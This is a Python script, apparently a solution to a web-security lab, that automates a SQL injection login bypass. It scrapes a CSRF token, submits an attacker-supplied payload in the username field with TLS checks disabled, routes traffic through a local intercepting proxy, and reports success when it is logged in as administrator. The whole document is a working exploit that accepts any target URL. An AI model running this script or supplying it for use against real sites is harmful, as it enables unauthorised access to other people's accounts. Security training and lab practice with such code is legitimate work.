
#SQL injection vulnerability allowing login bypass
import requests
import urllib3
import sys  
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

s=requests.Session()

def main():
        try:
            url=sys.argv[1].strip()
            payload=sys.argv[2].strip()    
        except IndexError:
            print("[-] Usage %s <url> <payload>"%sys.argv[0])
            sys.exit()
        if(exploit(s,url,payload)):
            print("[+] SQLI Successful Logged in as Administrator")
        else:
            print("[-] SQLI Failed")

def exploit(s,url,payload):
        
        csrf=get_csrf_token(s,url)
        data={"csrf":csrf,"username":payload,"password":"random"}
        r=s.post(url,data=data,verify=False,proxies=proxies)
        if "Log out" in r.text:
            return True
        else:
            return False

def get_csrf_token(s,url):
    r=s.get(url,verify=False,proxies=proxies)
    soup=BeautifulSoup(r.text,'html.parser')
    csrf=soup.find("input")["value"]
    return csrf

if __name__=="__main__":
        main()





